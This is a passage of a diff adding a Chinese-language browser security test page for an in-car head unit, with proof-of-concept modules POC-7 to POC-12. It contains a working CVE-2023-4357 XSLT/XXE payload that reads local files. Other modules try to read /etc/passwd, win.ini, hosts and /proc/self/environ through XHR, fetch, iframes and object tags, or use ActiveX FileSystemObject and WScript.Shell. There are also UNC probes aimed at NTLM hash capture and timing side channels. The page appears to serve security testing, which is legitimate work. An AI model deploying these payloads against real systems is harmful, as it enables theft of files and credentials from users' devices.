+    '<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">\n'+
+    '<xsl:output method="html"/>\n'+
+    '<xsl:template match="/">\n'+
+    '<html><body>\n'+
+    '<h3>XXE 读取结果 (CVE-2023-4357)</h3>\n'+
+    '<pre style="background:#111;color:#0f0;padding:10px;white-space:pre-wrap;">\n'+
+    '<xsl:copy-of select="document(\'data:text/xml,%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C!DOCTYPE%20x%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22file://'+encodedPath+'%22%3E%5D%3E%3Cx%3E%26xxe%3B%3C/x%3E\')"/>\n'+
+    '</pre>\n'+
+    '<p><small>如果上方显示文件内容，说明漏洞存在</small></p>\n'+
+    '</body></html>\n'+
+    '</xsl:template>\n'+
+    '</xsl:stylesheet>';
+
+  var xmlPayload='<?xml version="1.0" encoding="UTF-8"?>\n'+
+    '<?xml-stylesheet type="text/xsl" href="data:text/xml;base64,'+btoa(xslt)+'"?>\n'+
+    '<root location="ent" />';
+
+  var iframe=document.createElement('iframe');
+  iframe.style.width='100%';
+  iframe.style.height='350px';
+  iframe.style.border='1px solid #30363d';
+  iframe.style.borderRadius='6px';
+  iframe.style.marginTop='8px';
+  iframe.src='data:text/xml;base64,'+btoa(xmlPayload);
+  container.appendChild(iframe);
+  out('f7-output','✅ Payload 已注入 iframe，请查看下方 iframe 中的结果\n','c-ok');
+  out('f7-output','💡 如果 iframe 中显示文件内容 = 漏洞存在\n','c-info');
+  out('f7-output','💡 如果 iframe 中空白或报错 = 已修复\n','c-info');
+}
+
+// ==================== POC-8: file:// 协议直接访问 ====================
+function poc8XHRRead(filePath) {
+  clearPre('f8-output');
+  out('f8-output','🎯 尝试通过 XMLHttpRequest 读取: '+filePath+'\n','c-info');
+  out('f8-output','📍 当前页面协议: '+location.protocol+'\n','c-info');
+
+  if(location.protocol!=='file:'){
+    out('f8-output','⚠️ 当前非 file:// 协议，由于同源策略(CORS)，此测试大概率失败\n','c-warn');
+    out('f8-output','💡 请将本页面保存到本地，以 file:// 协议打开后再测试\n','c-info');
+  }
+
+  var xhr=new XMLHttpRequest();
+  xhr.onreadystatechange=function(){
+    if(xhr.readyState===4){
+      if(xhr.status===200||xhr.status===0){
+        out('f8-output','✅ 读取成功! (status:'+xhr.status+')\n','c-ok');
+        out('f8-output','📏 长度: '+xhr.responseText.length+' 字符\n','c-info');
+        out('f8-output','━'.repeat(40)+'\n','');
+        out('f8-output',truncate(xhr.responseText,3000),'c-ok');
+      } else {
+        out('f8-output','❌ 读取失败 status:'+xhr.status+' statusText:'+xhr.statusText+'\n','c-err');
+      }
+    }
+  };
+  xhr.onerror=function(){
+    out('f8-output','❌ 网络错误 — 同源策略或 CORS 阻止了请求\n','c-err');
+  };
+  xhr.ontimeout=function(){
+    out('f8-output','⏰ 请求超时\n','c-warn');
+  };
+  try{
+    xhr.open('GET', filePath, true);
+    xhr.timeout=10000;
+    xhr.send();
+    out('f8-output','⏳ XHR 请求已发送...\n','c-info');
+  } catch(err) {
+    out('f8-output','❌ 异常: '+err.message+'\n','c-err');
+  }
+}
+
+function poc8IframeRead() {
+  clearPre('f8-output');
+  var container=$('f8-iframe-container'); container.innerHTML='';
+  var testPaths=['./','file-reader.html','1.html','xss.html','../','file:///etc/passwd','file:///C:/Windows/win.ini'];
+  out('f8-output','🖼️ 通过 iframe 尝试加载多个路径...\n','c-info');
+  testPaths.forEach(function(p){
+    var iframe=document.createElement('iframe');
+    iframe.src=p;
+    iframe.style.width='48%';
+    iframe.style.height='80px';
+    iframe.style.border='1px solid #30363d';
+    iframe.style.margin='4px';
+    iframe.style.borderRadius='4px';
+    iframe.title=p;
+    var label=document.createElement('span');
+    label.textContent=p+' ';
+    label.style.fontSize='0.7em';
+    label.style.color='#8b949e';
+    container.appendChild(label);
+    container.appendChild(iframe);
+    out('f8-output','  📄 尝试加载: '+p+'\n','c-info');
+  });
+  out('f8-output','\n💡 如果上方出现内容 = 可读取\n','c-info');
+}
+
+function poc8FetchRead() {
+  clearPre('f8-output');
+  out('f8-output','🌐 尝试通过 fetch() 读取文件...\n','c-info');
+  out('f8-output','📍 当前协议: '+location.protocol+'\n','c-info');
+
+  var testPaths;
+  if(location.protocol==='file:'){
+    testPaths=['./','file-reader.html','1.html','../index.html'];
+  } else {
+    testPaths=['file:///etc/passwd','file:///C:/Windows/System32/drivers/etc/hosts'];
+    out('f8-output','⚠️ 非 file:// 协议，fetch file:// 大概率被阻止\n','c-warn');
+  }
+
+  testPaths.forEach(function(p){
+    out('f8-output','\n🔍 尝试 fetch: '+p+'\n','c-info');
+    fetch(p, {mode:'no-cors'}).then(function(r){
+      out('f8-output','  ✅ fetch 返回: '+r.status+' '+r.statusText+' type:'+r.type+'\n','c-ok');
+      if(r.type==='opaque'){
+        out('f8-output','  ⚠️ opaque 响应 — 内容不可读（CORS 限制）\n','c-warn');
+      }
+    }).catch(function(err){
+      out('f8-output','  ❌ fetch 失败: '+err.message+'\n','c-err');
+    });
+  });
+}
+
+// ==================== POC-9: ActiveX ====================
+function poc9ActiveXRead(filePath) {
+  clearPre('f9-output');
+  out('f9-output','🎯 尝试 ActiveX 读取: '+filePath+'\n','c-info');
+  if(typeof ActiveXObject==='undefined'){
+    out('f9-output','❌ ActiveXObject 不可用 (非 IE 内核或已禁用)\n','c-err');
+    return;
+  }
+  try{
+    var fso=new ActiveXObject('Scripting.FileSystemObject');
+    out('f9-output','✅ Scripting.FileSystemObject 创建成功\n','c-ok');
+    try{
+      var file=fso.OpenTextFile(filePath, 1);
+      var content=file.ReadAll();
+      file.Close();
+      out('f9-output','✅ 读取成功! 长度: '+content.length+' 字符\n','c-ok');
+      out('f9-output','━'.repeat(40)+'\n','');
+      out('f9-output',truncate(content,3000),'c-ok');
+    } catch(err) {
+      out('f9-output','❌ 文件读取失败: '+err.message+'\n','c-err');
+    }
+  } catch(err) {
+    out('f9-output','❌ ActiveX 创建失败: '+err.message+'\n','c-err');
+  }
+}
+
+function poc9ActiveXListDir(dirPath) {
+  clearPre('f9-output');
+  out('f9-output','📂 尝试列出目录: '+dirPath+'\n','c-info');
+  if(typeof ActiveXObject==='undefined'){
+    out('f9-output','❌ ActiveXObject 不可用\n','c-err'); return;
+  }
+  try{
+    var fso=new ActiveXObject('Scripting.FileSystemObject');
+    var folder=fso.GetFolder(dirPath);
+    out('f9-output','✅ 目录存在: '+folder.Name+'\n','c-ok');
+    out('f9-output','📁 子文件夹:\n','c-info');
+    var subfolders=new Enumerator(folder.SubFolders);
+    for(;!subfolders.atEnd();subfolders.moveNext()){
+      out('f9-output','  📁 '+subfolders.item().Name+'\n','c-path');
+    }
+    out('f9-output','📄 文件:\n','c-info');
+    var files=new Enumerator(folder.Files);
+    var count=0;
+    for(;!files.atEnd();files.moveNext()){
+      var f=files.item();
+      out('f9-output','  📄 '+f.Name+' ('+formatSize(f.Size)+')\n','c-ok');
+      if(++count>50){ out('f9-output','  ... 还有更多\n','c-warn'); break; }
+    }
+  } catch(err) {
+    out('f9-output','❌ 失败: '+err.message+'\n','c-err');
+  }
+}
+
+function poc9WshShell() {
+  clearPre('f9-output');
+  out('f9-output','💣 测试 WScript.Shell...\n','c-info');
+  if(typeof ActiveXObject==='undefined'){
+    out('f9-output','❌ ActiveXObject 不可用\n','c-err'); return;
+  }
+  try{
+    var shell=new ActiveXObject('WScript.Shell');
+    out('f9-output','✅ WScript.Shell 创建成功!\n','c-ok');
+    out('f9-output','⚠️ 这意味着可以执行任意系统命令\n','c-warn');
+    try{
+      var env=shell.ExpandEnvironmentStrings('%USERPROFILE%');
+      out('f9-output','📁 用户目录: '+env+'\n','c-info');
+    } catch(e){}
+    try{
+      var env2=shell.ExpandEnvironmentStrings('%SYSTEMROOT%');
+      out('f9-output','📁 系统目录: '+env2+'\n','c-info');
+    } catch(e){}
+  } catch(err) {
+    out('f9-output','❌ WScript.Shell 创建失败: '+err.message+'\n','c-err');
+  }
+}
+
+// ==================== POC-10: 协议探测 ====================
+function poc10ProbeProtocol(url) {
+  clearPre('f10-output');
+  out('f10-output','🔍 探测 URI scheme: '+url+'\n','c-info');
+
+  // 使用多种方法探测
+  // 方法1: img onerror/onload
+  var img=new Image();
+  var start=Date.now();
+  img.onload=function(){
+    out('f10-output','  ✅ img 加载成功 (耗时:'+(Date.now()-start)+'ms) — 协议可用\n','c-ok');
+  };
+  img.onerror=function(){
+    out('f10-output','  ❌ img 加载失败 (耗时:'+(Date.now()-start)+'ms) — 协议不可用或资源不存在\n','c-err');
+  };
+  img.src=url;
+
+  // 方法2: iframe
+  var iframe=document.createElement('iframe');
+  iframe.src=url;
+  iframe.style.width='0'; iframe.style.height='0'; iframe.style.display='none';
+  iframe.onload=function(){
+    out('f10-output','  ✅ iframe 加载成功 — 协议可用\n','c-ok');
+    try{
+      var doc=iframe.contentDocument||iframe.contentWindow.document;
+      if(doc) out('f10-output','  📄 可访问 iframe 内容 (无SOP限制)\n','c-ok');
+    } catch(e){
+      out('f10-output','  🔒 iframe 内容被SOP保护 (不同源)\n','c-warn');
+    }
+  };
+  iframe.onerror=function(){
+    out('f10-output','  ❌ iframe 加载失败\n','c-err');
+  };
+  document.body.appendChild(iframe);
+}
+
+function poc10TestUNC() {
+  clearPre('f10-output');
+  out('f10-output','🔍 探测 UNC 路径 (SMB)...\n','c-info');
+  out('f10-output','💡 如果浏览器尝试访问 UNC 路径，可捕获 NTLM hash\n','c-info');
+
+  var uncPaths=[
+    '\\\\localhost\\C$\\Windows\\win.ini',
+    '\\\\127.0.0.1\\C$\\Windows\\System32\\drivers\\etc\\hosts',
+    'file://localhost/C:/Windows/win.ini',
+    'file://127.0.0.1/C$/Windows/win.ini'
+  ];
+
+  uncPaths.forEach(function(p){
+    var img=new Image();
+    var start=Date.now();
+    img.onload=function(){ out('f10-output','  ✅ '+p+' — 成功 ('+(Date.now()-start)+'ms)\n','c-ok'); };
+    img.onerror=function(){ out('f10-output','  ❌ '+p+' — 失败 ('+(Date.now()-start)+'ms)\n','c-err'); };
+    img.src=p;
+    out('f10-output','  🔍 探测: '+p+'\n','c-info');
+  });
+}
+
+function poc10TestContentTypeSniff() {
+  clearPre('f10-output');
+  out('f10-output','🔍 Content-Type 嗅探测试\n','c-info');
+  out('f10-output','💡 测试浏览器是否将 HTML/JS 内容伪装为图片后仍会执行\n','c-info');
+
+  // 创建包含 JS 的 data URI 伪装为 image/png
+  var maliciousSVG='<svg xmlns="http://www.w3.org/2000/svg"><script>alert("sniff")</script></svg>';
+  var b64=window.btoa(maliciousSVG);
+
+  out('f10-output','📄 测试 1: data:image/svg+xml;base64,...\n','c-info');
+  var img=document.createElement('img');
+  img.src='data:image/svg+xml;base64,'+b64;
+  img.onload=function(){ out('f10-output','  ✅ SVG 作为 img 加载成功 (JS不会执行)\n','c-ok'); };
+  img.onerror=function(){ out('f10-output','  ❌ SVG 作为 img 加载失败\n','c-err'); };
+
+  out('f10-output','📄 测试 2: iframe 加载伪装 Content-Type\n','c-info');
+  var iframe=document.createElement('iframe');
+  iframe.src='data:text/html;base64,'+btoa('<script>parent.postMessage("sniff-ok","*")</script>');
+  iframe.style.display='none';
+  document.body.appendChild(iframe);
+
+  window.addEventListener('message', function(e){
+    if(e.data==='sniff-ok'){
+      out('f10-output','  ✅ data:text/html 中 JS 成功执行\n','c-ok');
+    }
+  });
+}
+
+// ==================== POC-11: SW / Cache / Blob ====================
+function poc11TestServiceWorker() {
+  clearPre('f11-output');
+  out('f11-output','🔍 Service Worker 可用性检测\n','c-info');
+  if(!('serviceWorker' in navigator)){
+    out('f11-output','❌ Service Worker API 不可用\n','c-err'); return;
+  }
+  out('f11-output','✅ Service Worker API 可用\n','c-ok');
+  out('f11-output','📍 协议: '+location.protocol+'\n','c-info');
+  if(location.protocol!=='https:' && location.protocol!=='file:'){
+    out('f11-output','⚠️ SW 需要 HTTPS 或 localhost/file:// 协议\n','c-warn');
+  }
+  // 列出已注册的 SW
+  navigator.serviceWorker.getRegistrations().then(function(regs){
+    out('f11-output','📋 已注册的 SW: '+regs.length+' 个\n','c-info');
+    regs.forEach(function(r){
+      out('f11-output','  🔧 scope: '+r.scope+' active:'+!!r.active+'\n','c-info');
+    });
+  }).catch(function(err){
+    out('f11-output','❌ 获取 SW 列表失败: '+err.message+'\n','c-err');
+  });
+}
+
+function poc11CacheTest() {
+  clearPre('f11-output');
+  out('f11-output','🔍 Cache API 测试\n','c-info');
+  if(!('caches' in window)){
+    out('f11-output','❌ Cache API 不可用\n','c-err'); return;
+  }
+  out('f11-output','✅ Cache API 可用\n','c-ok');
+  caches.keys().then(function(names){
+    out('f11-output','📋 已有缓存: '+names.length+' 个\n','c-info');
+    names.forEach(function(name){
+      out('f11-output','  📦 '+name+'\n','c-info');
+    });
+    // 尝试打开/写入一个测试缓存
+    return caches.open('__poc11_test__');
+  }).then(function(cache){
+    out('f11-output','✅ 成功创建/打开测试缓存\n','c-ok');
+    // 读取测试缓存内容
+    return cache.keys();
+  }).then(function(requests){
+    out('f11-output','📋 测试缓存条目: '+requests.length+'\n','c-info');
+    requests.forEach(function(req){
+      out('f11-output','  📄 '+req.url+'\n','c-info');
+    });
+    // 清理测试缓存
+    return caches.delete('__poc11_test__');
+  }).catch(function(err){
+    out('f11-output','❌ 缓存操作失败: '+err.message+'\n','c-err');
+  });
+}
+
+function poc11BlobTest() {
+  clearPre('f11-output');
+  out('f11-output','🔍 Blob URL 构造测试\n','c-info');
+  try{
+    // 创建恶意内容的 Blob
+    var testContent='=== 敏感文件模拟内容 ===\nhosts file content here...';
+    var blob=new Blob([testContent], {type:'text/plain'});
+    var url=URL.createObjectURL(blob);
+    out('f11-output','✅ Blob URL 创建成功: '+url+'\n','c-ok');
+
+    // 尝试用 XHR 读取自己的 Blob
+    var xhr=new XMLHttpRequest();
+    xhr.open('GET', url, false);
+    try{
+      xhr.send();
+      out('f11-output','✅ XHR 读取 Blob 成功: '+xhr.responseText.substring(0,100)+'\n','c-ok');
+    } catch(e){
+      out('f11-output','❌ XHR 读取 Blob 失败: '+e.message+'\n','c-err');
+    }
+
+    // 检查是否可以将Blob URL 传递给外部
+    out('f11-output','💡 Blob URL 仅在当前 origin 有效，但可通过 postMessage 传递\n','c-info');
+
+    URL.revokeObjectURL(url);
+  } catch(err){
+    out('f11-output','❌ Blob 操作失败: '+err.message+'\n','c-err');
+  }
+}
+
+function poc11ObjectURLCreate() {
+  clearPre('f11-output');
+  out('f11-output','🔍 createObjectURL 信息泄露测试\n','c-info');
+  out('f11-output','💡 测试 createObjectURL 是否可用于泄漏文件内容路径\n','c-info');
+
+  // 检查 URL.createObjectURL 的可用性和限制
+  if(typeof URL!=='undefined' && 'createObjectURL' in URL){
+    out('f11-output','✅ URL.createObjectURL 可用\n','c-ok');
+
+    // 测试能否从 MediaSource 创建 URL
+    if('MediaSource' in window){
+      try{
+        var ms=new MediaSource();
+        var msUrl=URL.createObjectURL(ms);
+        out('f11-output','✅ MediaSource URL 创建: '+msUrl+'\n','c-ok');
+        URL.revokeObjectURL(msUrl);
+      } catch(e){
+        out('f11-output','❌ MediaSource URL 创建失败: '+e.message+'\n','c-err');
+      }
+    }
+
+    // 测试是否可枚举已创建的 objectURL
+    out('f11-output','⚠️ Chrome 不允许枚举已创建的 objectURL\n','c-warn');
+    out('f11-output','💡 但如果有文件 input，可以:\n','c-info');
+    out('f11-output','  1. 用户选择文件 → createObjectURL → 获得 blob: URL\n','c-info');
+    out('f11-output','  2. 将 blob: URL 设为 img.src → 文件内容被解码渲染\n','c-info');
+  } else {
+    out('f11-output','❌ URL.createObjectURL 不可用\n','c-err');
+  }
+}
+
+// ==================== POC-12: CSS/侧信道 ====================
+function poc12CSSProbe() {
+  clearPre('f12-output');
+  out('f12-output','🎨 CSS 背景图侧信道探测\n','c-info');
+  out('f12-output','💡 利用 CSS background-image 请求本地文件，通过 onload/onerror 时间差判断文件是否存在\n','c-info');
+
+  var paths=[
+    'file:///etc/passwd',
+    'file:///C:/Windows/win.ini',
+    'file:///C:/Windows/System32/drivers/etc/hosts',
+    'file:///etc/hostname',
+    'file:///proc/self/environ'
+  ];
+
+  var style=document.createElement('style');
+  document.head.appendChild(style);
+
+  paths.forEach(function(p){
+    var className='poc12_'+Math.random().toString(36).substr(2,8);
+    style.sheet.insertRule('.'+className+'{ background-image:url('+p+'); }', 0);
+
+    var div=document.createElement('div');
+    div.className=className;
+    div.style.position='absolute';
+    div.style.width='1px';
+    div.style.height='1px';
+    div.style.top='-9999px';
+    document.body.appendChild(div);
+
+    var start=Date.now();
+    var img=new Image();
+    img.onload=function(){ out('f12-output','  ✅ '+p+' → 文件存在 ('+(Date.now()-start)+'ms)\n','c-ok'); };
+    img.onerror=function(){ out('f12-output','  ❌ '+p+' → 不存在或无权访问 ('+(Date.now()-start)+'ms)\n','c-err'); };
+    img.src=p;
+    out('f12-output','  🔍 探测: '+p+'\n','c-info');
+  });
+}
+
+function poc12ImgProbe() {
+  clearPre('f12-output');
+  out('f12-output','🖼️ img 标签本地文件探测\n','c-info');
+  out('f12-output','💡 通过 img 标签尝试加载本地文件，根据加载时间/是否成功判断文件存在\n','c-info');
+
+  var testPaths=[
+    {path:'file:///etc/passwd', desc:'Linux密码文件'},
+    {path:'file:///C:/Windows/win.ini', desc:'Windows配置'},
+    {path:'file:///C:/boot.ini', desc:'启动配置'},
+    {path:'file:///C:/pagefile.sys', desc:'页面文件'},
+    {path:'file:///tmp/test.txt', desc:'临时文件'},
+    {path:'file:///var/log/syslog', desc:'系统日志'},
+    {path:'file:///proc/version', desc:'内核版本'},
+  ];
+
+  var container=$('f12-output').parentNode;
+  testPaths.forEach(function(t){
+    var img=document.createElement('img');
+    img.style.width='1px'; img.style.height='1px'; img.style.position='absolute'; img.style.top='-9999px';
+    var start=Date.now();
+    img.onload=function(){
+      out('f12-output','  ✅ '+t.path+' ('+t.desc+') → 可访问 ('+(Date.now()-start)+'ms)\n','c-ok');
+    };
+    img.onerror=function(){
+      out('f12-output','  ❌ '+t.path+' ('+t.desc+') → 不可访问 ('+(Date.now()-start)+'ms)\n','c-err');
+    };
+    img.src=t.path;
+    document.body.appendChild(img);
+    out('f12-output','  🔍 探测: '+t.path+'\n','c-info');
+  });
+}
+
+function poc12ObjectProbe() {
+  clearPre('f12-output');
+  out('f12-output','📦 object/embed 标签本地文件探测\n','c-info');
+  out('f12-output','💡 使用 object 标签尝试加载本地文件（PDF/文本/HTML），可渲染文件内容\n','c-info');
+
+  var testPaths=[
+    'file:///etc/passwd',
+    'file:///C:/Windows/win.ini',
+    'file:///C:/Users/Public/Documents/',
+  ];
+
+  testPaths.forEach(function(p){
+    var obj=document.createElement('object');
+    obj.data=p;
+    obj.type='text/plain';
+    obj.style.width='0'; obj.style.height='0'; obj.style.display='none';
+    obj.onload=function(){ out('f12-output','  ✅ '+p+' → object 加载成功\n','c-ok'); };
+    obj.onerror=function(){ out('f12-output','  ❌ '+p+' → object 加载失败\n','c-err'); };
+    document.body.appendChild(obj);
+    out('f12-output','  🔍 object 探测: '+p+'\n','c-info');
+    setTimeout(function(){ document.body.removeChild(obj); }, 3000);
+  });
+}
+
+function poc12LinkPrefetch() {
+  clearPre('f12-output');
+  out('f12-output','🔗 link prefetch/dns-prefetch 侧信道\n','c-info');
+  out('f12-output','💡 检测浏览器是否支持 link rel=prefetch 加载本地资源\n','c-info');
+
+  var paths=[
+    'file:///etc/passwd',
+    'file:///C:/Windows/win.ini',
+  ];
+
+  paths.forEach(function(p){
+    var link=document.createElement('link');
+    link.rel='prefetch';
+    link.href=p;
+    var start=Date.now();
+    link.onload=function(){ out('f12-output','  ✅ '+p+' → prefetch 成功 ('+(Date.now()-start)+'ms)\n','c-ok'); };
+    link.onerror=function(){ out('f12-output','  ❌ '+p+' → prefetch 失败 ('+(Date.now()-start)+'ms)\n','c-err'); };
+    document.head.appendChild(link);
+    out('f12-output','  🔍 prefetch: '+p+'\n','c-info');
+  });
+}
+
+function poc12TimingProbe() {
+  clearPre('f12-output');
+  out('f12-output','⏱️ 时序侧信道探测\n','c-info');
+  out('f12-output','💡 基于文件读取时间的侧信道：存在的文件读取快，不存在的文件触发DNS/超时慢\n','c-info');
+
+  var testCases=[
+    {path:'file:///etc/passwd', label:'应存在'},
+    {path:'file:///NONEXIST_FILE_99999', label:'不存在'},
+    {path:'file:///C:/Windows/System32/drivers/etc/hosts', label:'应存在(Win)'},
+    {path:'file:///C:/NONEXIST_DIR_99999/fake.txt', label:'不存在(Win)'},
+  ];
+
+  var results=[];
+  var done=0;
+
+  testCases.forEach(function(tc){
+    var start=performance.now();
+    var img=new Image();
+    img.onload=function(){
+      var elapsed=performance.now()-start;
+      results.push({path:tc.path, label:tc.label, elapsed:elapsed, status:'loaded'});
+      done++; if(done===testCases.length) showResults();
+    };
+    img.onerror=function(){
+      var elapsed=performance.now()-start;
+      results.push({path:tc.path, label:tc.label, elapsed:elapsed, status:'error'});
+      done++; if(done===testCases.length) showResults();
+    };
+    img.src=tc.path;
+  });
+
+  function showResults(){
+    out('f12-output','\n📊 时序分析结果:\n','c-info');
+    out('f12-output','━'.repeat(55)+'\n','');
+    out('f12-output','路径'.padEnd(45)+'标签'.padEnd(15)+'耗时'.padEnd(10)+'状态\n','c-info');
+    out('f12-output','━'.repeat(55)+'\n','');
+
+    // 计算基线
+    var nonExistTimes=results.filter(function(r){return r.label.indexOf('不存在')>=0;}).map(function(r){return r.elapsed;});
+    var existTimes=results.filter(function(r){return r.label.indexOf('应存在')>=0;}).map(function(r){return r.elapsed;});
+
+    results.forEach(function(r){
+      var line=r.path.substring(0,42).padEnd(45)+r.label.padEnd(15)+r.elapsed.toFixed(1).padEnd(10)+r.status+'\n';
+      out('f12-output',line,r.status==='loaded'?'c-ok':'c-err');
+    });
+
+    if(nonExistTimes.length && existTimes.length){
+      var avgNon=nonExistTimes.reduce(function(a,b){return a+b;},0)/nonExistTimes.length;
+      var avgExist=existTimes.reduce(function(a,b){return a+b;},0)/existTimes.length;
+      out('f12-output','\n📈 平均耗时 — 存在: '+avgExist.toFixed(1)+'ms | 不存在: '+avgNon.toFixed(1)+'ms\n','c-info');
+      if(Math.abs(avgExist-avgNon)>50){
+        out('f12-output','⚠️ 存在显著时间差异，可用于侧信道攻击!\n','c-warn');
+      } else {
+        out('f12-output','✅ 时间差异不明显\n','c-ok');
+      }
+    }
+  }
+}
+
+// ==================== 初始化 ====================
+document.addEventListener('DOMContentLoaded', function(){
+  console.log('🚗 车机浏览器安全测试 POC 已就绪');
+  console.log('共 12 个 POC 模块:');
+  console.log('  POC-1: FileReader 单文件');
+  console.log('  POC-2: 多文件批量');
+  console.log('  POC-3: webkitdirectory 文件夹');
+  console.log('  POC-4: Drag & Drop');
+  console.log('  POC-5: File System Access API');
+  console.log('  POC-6: 剪贴板粘贴');
+  console.log('  POC-7: CVE-2023-4357 XXE');
+  console.log('  POC-8: file:// 协议');
+  console.log('  POC-9: ActiveX');
+  console.log('  POC-10: 协议探测');
+  console.log('  POC-11: SW/Cache/Blob');
+  console.log('  POC-12: CSS/侧信道');
+});
+</script>
+
+</body>
+</html>
